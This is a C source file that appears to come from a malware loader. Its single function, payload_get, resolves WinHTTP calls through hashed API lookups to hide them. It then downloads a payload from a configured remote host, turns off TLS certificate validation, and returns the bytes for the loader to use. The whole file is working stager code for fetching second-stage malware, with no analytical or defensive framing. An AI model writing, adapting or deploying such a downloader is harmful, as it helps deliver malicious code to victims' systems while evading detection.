#include "../../../includes/payload/payload.h"
#include "../../../includes/core/core.h"
#include "../../../includes/apis/apis.h"





LPVOID payload_get(PDWORD PayloadSize) {

    HMODULE winhttp = g_ldr->apis->LoadLibraryA("winhttp.dll");

    g_ldr->apis->WinHttpOpen = (pWinHttpOpen)GetProc(winhttp, HASHED_WINHTTPOPEN);
    g_ldr->apis->WinHttpConnect = (pWinHttpConnect)GetProc(winhttp, HASHED_WINHTTPCONNECT);
    g_ldr->apis->WinHttpOpenRequest = (pWinHttpOpenRequest)GetProc(winhttp, HASHED_WINHTTPOPENREQUEST);
    g_ldr->apis->WinHttpAddRequestHeaders = (pWinHttpAddRequestHeaders)GetProc(winhttp, HASHED_WINHTTPADDREQUESTHEADERS);
    g_ldr->apis->WinHttpSendRequest = (pWinHttpSendRequest)GetProc(winhttp, HASHED_WINHTTPSENDREQUEST);
    g_ldr->apis->WinHttpReceiveResponse = (pWinHttpReceiveResponse)GetProc(winhttp, HASHED_WINHTTPRECEIVERESPONSE);
    g_ldr->apis->WinHttpQueryHeaders = (pWinHttpQueryHeaders)GetProc(winhttp, HASHED_WINHTTPQUERYHEADERS);
    g_ldr->apis->WinHttpQueryDataAvailable = (pWinHttpQueryDataAvailable)GetProc(winhttp, HASHED_WINHTTPQUERYDATAAVAILABLE);
    g_ldr->apis->WinHttpReadData = (pWinHttpReadData)GetProc(winhttp, HASHED_WINHTTPREADDATA);
    g_ldr->apis->WinHttpSetOption = (pWinHttpSetOption)GetProc(winhttp, HASHED_WINHTTPSETOPTION);
    g_ldr->apis->WinHttpCloseHandle = (pWinHttpCloseHandle)GetProc(winhttp, HASHED_WINHTTPCLOSEHANDLE);

    HINTERNET hSession = NULL, hConnect = NULL, hRequest = NULL;
    DWORD Size = 0, Downloaded = 0, TotalSize = 0, bufferSize = 4096, httpFlags;
    BOOL bResults;
    LPVOID outBuffer = NULL;

    DBGW(L"URL: %s", g_ldr->config->http.url);
    DBGW(L"%s\n", g_ldr->config->http.uri);

    hSession = g_ldr->apis->WinHttpOpen(L"TEST", WINHTTP_ACCESS_TYPE_NO_PROXY,
        WINHTTP_NO_PROXY_NAME,
        WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hSession) goto CLEANUP;

    hConnect = g_ldr->apis->WinHttpConnect(hSession, g_ldr->config->http.url, g_ldr->config->http.port, 0);
    if (!hConnect)
    {
        DBGA("[!] WinHttpConnect Failed: %lu\n", GetLastError());
        goto CLEANUP;
    }

    httpFlags = g_ldr->config->http.isSecure ? WINHTTP_FLAG_SECURE : 0;

    hRequest = g_ldr->apis->WinHttpOpenRequest(hConnect, L"GET", g_ldr->config->http.uri, NULL,
        WINHTTP_NO_REFERER,
        WINHTTP_DEFAULT_ACCEPT_TYPES,
        httpFlags);
    if (!hRequest) {
        DBGA("[!] WinhttpOpenRequest Failed: %lu\n", GetLastError());

        goto CLEANUP;
    }

    if (g_ldr->config->http.isSecure) {
        DWORD dwFlags = SECURITY_FLAG_IGNORE_UNKNOWN_CA | SECURITY_FLAG_IGNORE_CERT_DATE_INVALID | SECURITY_FLAG_IGNORE_CERT_CN_INVALID
            | SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE;

        g_ldr->apis->WinHttpSetOption(hRequest, WINHTTP_OPTION_SECURITY_FLAGS, &dwFlags, sizeof(dwFlags));
  
    }
    bResults = g_ldr->apis->WinHttpSendRequest(hRequest,
        WINHTTP_NO_ADDITIONAL_HEADERS, 0,
        WINHTTP_NO_REQUEST_DATA, 0,
        0, 0);
    if (!bResults) {
        DBGA("[!] WinHttpSendRequest Failed: %lu\n", GetLastError());
        goto CLEANUP;
    }

    bResults = g_ldr->apis->WinHttpReceiveResponse(hRequest, NULL);
    if (!bResults)
    {
        DBGA("[!] WinHttpReceiveResponse Failed: %lu\n", GetLastError());

        goto CLEANUP;
    }
    outBuffer = g_ldr->apis->LocalAlloc(LMEM_FIXED | LMEM_ZEROINIT, bufferSize);
    if (!outBuffer) {
        DBGA("[!] LocalAlloc Failed: %lu\n", GetLastError());
        goto CLEANUP;
    }
    do {
        Size = 0;
        if (!g_ldr->apis->WinHttpQueryDataAvailable(hRequest, &Size))
            break;
        if (Size == 0)
            break;

        if (TotalSize + Size > bufferSize) {
            while (TotalSize + Size > bufferSize) {
                bufferSize *= 2;
            }
            outBuffer = g_ldr->apis->LocalReAlloc(outBuffer, bufferSize, LMEM_MOVEABLE);
            if (!outBuffer) {
                DBGA("[!] LocalReAlloc Failed: %lu\n", GetLastError());

                goto CLEANUP;
            }
        }

        if (!g_ldr->apis->WinHttpReadData(hRequest, (PBYTE)outBuffer + TotalSize, Size, &Downloaded)) {
            break;
        }

        TotalSize += Downloaded;
    } while (Size > 0);

    *PayloadSize = TotalSize;

CLEANUP:
    if (hSession) g_ldr->apis->WinHttpCloseHandle(hSession);
    if (hConnect) g_ldr->apis->WinHttpCloseHandle(hConnect);
    if (hRequest) g_ldr->apis->WinHttpCloseHandle(hRequest);

    if (TotalSize == 0 && outBuffer) {
        g_ldr->apis->LocalFree(outBuffer);
        outBuffer = NULL;
    }

    return outBuffer;
}
